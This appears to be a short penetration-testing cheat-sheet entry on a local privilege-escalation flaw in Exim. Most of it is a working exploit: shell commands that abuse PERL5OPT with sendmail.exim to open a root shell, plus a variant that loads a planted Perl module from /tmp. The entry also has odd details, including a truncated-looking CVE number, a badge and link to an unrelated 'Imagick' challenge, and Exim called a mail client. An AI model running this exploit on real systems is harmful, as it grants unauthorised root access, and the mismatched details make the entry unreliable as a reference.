# Linux Vulnerable Applications

<div class="row row-cols-lg-2"><div>

#### Exim Mail Client | CVE-2016-153

[![imagick](../../../../_badges/rootme/realist/imagick.svg)](https://www.root-me.org/en/Challenges/Realist/Imagick)

Versions prior to 4.84-3 are vulnerable to LPE.

```shell!
$ PERL5OPT="-d/dev/null" /usr/sbin/sendmail.exim -ps victim@localhost
shell> p system("/bin/bash");
```

You can alternatively use a configuration stored in `/tmp/victim.pm` with `PERL5LIB=/tmp PERL5OPT=-Mvictim` before calling the program.
</div><div>
</div></div>